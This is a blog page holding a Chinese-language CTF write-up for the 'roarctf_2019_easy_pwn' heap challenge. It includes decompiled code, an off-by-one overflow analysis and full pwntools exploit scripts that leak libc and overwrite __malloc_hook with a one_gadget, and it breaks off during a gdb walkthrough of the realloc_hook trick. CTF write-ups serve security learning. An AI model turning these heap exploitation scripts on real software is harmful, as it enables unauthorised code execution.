@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说 checksec看一下 保护机制全开 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line">
+<meta property="og:type" content="article">
+<meta property="og:title" content="roarctf_2019_easy_pwn">
+<meta property="og:url" content="http://example.com/2023/01/29/roarctf-2019-easy-pwn/index.html">
+<meta property="og:site_name" content="C12en">
+<meta property="og:description" content="这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说 checksec看一下 保护机制全开 [!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7ba36face21e9ef4cd42d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7ba5bface21e9ef4d1272.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7c26aface21e9ef5c7bac.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7c2b9face21e9ef5d29b3.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7ce27face21e9ef75b146.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63d7d033face21e9ef79eb8c.png">
+<meta property="article:published_time" content="2023-01-29T13:31:46.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:20:32.593Z">
+<meta property="article:author" content="C12en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309142232390.png&#39;">
+        
+      
+    
+    <!-- title -->
+    <title>roarctf_2019_easy_pwn</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="C12en" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/02/02/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-Message-Board/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/01/27/SROP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/29/roarctf-2019-easy-pwn/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&text=roarctf_2019_easy_pwn"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&is_video=false&description=roarctf_2019_easy_pwn"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=roarctf_2019_easy_pwn&body=Check out this article: http://example.com/2023/01/29/roarctf-2019-easy-pwn/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&title=roarctf_2019_easy_pwn"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&name=roarctf_2019_easy_pwn&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/29/roarctf-2019-easy-pwn/&t=roarctf_2019_easy_pwn"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        roarctf_2019_easy_pwn
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">C12en</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-01-29T13:31:46.000Z" class="dt-published" itemprop="datePublished">2023-01-29</time>
+        
+        (Updated: <time datetime="2023-09-14T17:20:32.593Z" class="dt-updated" itemprop="dateModified">2023-09-15</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这道堆题比较简单 涉及到的知识点以往的文章都有介绍到 但是最后打malloc_hook的时候由于栈不满足onegadget的条件 所用到的realloc_hook的办法值得拿出来说一说</p>
+<p>checksec看一下 保护机制全开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>ida看一下伪代码</p>
+<p>main函数很常规 就基于菜单题实现的堆</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_AD0(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = recv_data(v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Tell me the secret about you!!&quot;</span>);</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Wrong try again!!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点抓edit函数和delete函数出来说 另外这题创建chunk用的是calloc函数 创建chunk的时候会清空chunk内容 使其为0</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_E82</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v2 = recv_data(v1);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(&amp;chunk_judge + <span class="number">4</span> * v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">      v2 = recv_data(<span class="number">1</span>);</span><br><span class="line">      v4 = compare(*(&amp;chunk_size + <span class="number">4</span> * v3), v2);</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">        v2 = recv_data2(chunk_point[<span class="number">2</span> * v3], v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据输入的index来索引bss段数组 如果该index有对应的chunk(即chunk_judge判断成功) 则输入size</p>
+<p>在edit函数输入的size和create chunk时输入的size二者作为compare函数的参数 跟进看一下用来干什么</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E26</span><span class="params">(<span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当edit_size-create_size&#x3D;10时 可以供我们多输入一个字节 那么利用四舍五入的机制 就可以做到溢出9个字节</p>
+<p>delete函数:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_F8E</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">  v0 = recv_data(v3);</span><br><span class="line">  v4 = v0;</span><br><span class="line">  v2 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0LL</span> &amp;&amp; v0 &lt;= <span class="number">15LL</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(&amp;chunk_judge + <span class="number">4</span> * v0);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;chunk_judge + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      *(&amp;chunk_size + <span class="number">4</span> * v0) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(chunk_point[<span class="number">2</span> * v0]);</span><br><span class="line">      chunk_point[<span class="number">2</span> * v2] = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>指针置零了 不存在uaf漏洞</p>
+<p>那么合计一下思路 可以利用覆写chunk size来合并chunk 从而获得free_chunk的指针 这样就可以泄露main_arena的真实地址 从而计算处真实地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,28013)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu16_64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure>
+
+<p>这样我们获得了一个free chunk的指针 即chunk2</p>
+<p>可以用其修改fd域 从而获得任意地址写的机会 因为libc版本是2.23 所以这里用malloc_hook_attack</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">payload = cyclic(<span class="number">0x13</span>)+p64(onegadget_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>按理来说这道题到这里就结束了 但是你会发现几个onegadget都不行 这是因为onegadget所要求的栈空间并不满足的问题</p>
+<p>这时候两种办法 一种是hgame2023的一题中利用到的double free也能触发malloc_hook 详细解释和手法可以去看我对应的wp</p>
+<p>还有一种办法是利用realloc来实现 下面详细介绍一下</p>
+<p>realloc函数是用于重新分配之前被分配过的chunk空间 其也有realloc_hook 并且也类似于malloc_hook 如果不为0则调用</p>
+<p>关键在于两点 一是realloc_hook和malloc_hook相邻 也意味着我们可以同时修改二者</p>
+<p>第二点在于realloc调用的时候会进行大量的push操作</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000846C0                 public realloc</span><br><span class="line">.text:00000000000846C0 realloc         proc near               ; CODE XREF: _realloc↑j</span><br><span class="line">.text:00000000000846C0                                         ; DATA XREF: LOAD:0000000000006BA0↑o ...</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 var_60          = qword ptr -60h</span><br><span class="line">.text:00000000000846C0 var_58          = byte ptr -58h</span><br><span class="line">.text:00000000000846C0 var_48          = byte ptr -48h</span><br><span class="line">.text:00000000000846C0</span><br><span class="line">.text:00000000000846C0 ; __unwind &#123;</span><br><span class="line">.text:00000000000846C0                 push    r15             ; Alternative name is &#x27;__libc_realloc&#x27;</span><br><span class="line">.text:00000000000846C2                 push    r14</span><br><span class="line">.text:00000000000846C4                 push    r13</span><br><span class="line">.text:00000000000846C6                 push    r12</span><br><span class="line">.text:00000000000846C8                 mov     r13, rsi</span><br><span class="line">.text:00000000000846CB                 push    rbp</span><br><span class="line">.text:00000000000846CC                 push    rbx</span><br><span class="line">.text:00000000000846CD                 mov     rbx, rdi</span><br><span class="line">.text:00000000000846D0                 sub     rsp, 38h</span><br><span class="line">.text:00000000000846D4                 mov     rax, cs:__realloc_hook_ptr</span><br><span class="line">.text:00000000000846DB                 mov     rax, [rax]</span><br><span class="line">.text:00000000000846DE                 test    rax, rax</span><br><span class="line">.text:00000000000846E1                 jnz     loc_848E8</span><br><span class="line">.text:00000000000846E7                 test    rsi, rsi</span><br><span class="line">.text:00000000000846EA                 jnz     short loc_846F5</span><br><span class="line">.text:00000000000846EC                 test    rdi, rdi</span><br><span class="line">.text:00000000000846EF                 jnz     loc_84960</span><br></pre></td></tr></table></figure>
+
+<p>所以可以修改我们的栈空间 使其符合条件(如果可以的话)</p>
+<p>我们先使用gdb动调看一下 onegadget的条件没有被满足时 对应的栈空间</p>
+<p>调试exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25622)</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;buu_libc_ubuntu16_64&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>)+<span class="string">b&#x27;\xe1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7ff4f33beb78</span>-<span class="number">0x7ff4f2ffa000</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">malloc_hook = libc_addr + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">8</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4526a</span></span><br><span class="line">realloc_addr = libc_addr + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">payload = cyclic(<span class="number">0xb</span>+<span class="number">0x8</span>)+p64(onegadget_addr)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *$rebase(0xccc)&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时断点打在calloc函数调用时 我们一步步s下去</p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba18face21e9ef4c9f79.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7ba36face21e9ef4cd42d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba36face21e9ef4cd42d.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/63d7ba5bface21e9ef4d1272.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63d7ba5bface21e9ef4d1272.png"></a></p>
+<p>此时进行了一个逻辑与操作 如果rax寄存器的值为0 那么逻辑与的结果为1 </p>
+<p>而jne指令当ZF零标志为0的时候 则会跳转 此时rax的值是一个地址 所以会执行jne跳转 我们继续跟进</p>
